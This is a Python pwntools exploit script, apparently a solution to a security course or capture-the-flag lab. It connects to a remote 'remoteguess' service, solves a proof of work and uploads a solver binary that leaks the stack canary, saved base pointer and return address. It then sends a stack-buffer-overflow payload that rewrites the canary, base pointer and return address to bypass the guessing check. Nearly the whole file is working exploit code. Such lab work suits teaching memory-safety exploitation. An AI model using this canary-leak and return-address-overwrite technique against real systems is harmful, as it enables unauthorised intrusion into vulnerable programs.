#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)
# pause()
if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

myguess = 1234

r.recvline() # to cover the first useless message
# the guess's canary is the same as solver , because all of the program's canaries are the same value
canary = int(r.recvline().strip(), 16)
# the guess's rbp is the same as solver , because both of their rbp is point to main function
rbp = int(r.recvline().strip(), 16)
# solver return address + 0x AB is the guess return address
ret = int(r.recvline().strip(), 16)+0xAB

payload = flat([
    str(myguess).encode('ascii').ljust(24,b'\0'),
    canary,
    rbp,
    ret,
    b'\0' * 12,
    p32(myguess)
])

# print(canary)
# print(rbp)
# print(ret)
r.sendlineafter(b'Show me your answer? ', payload)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
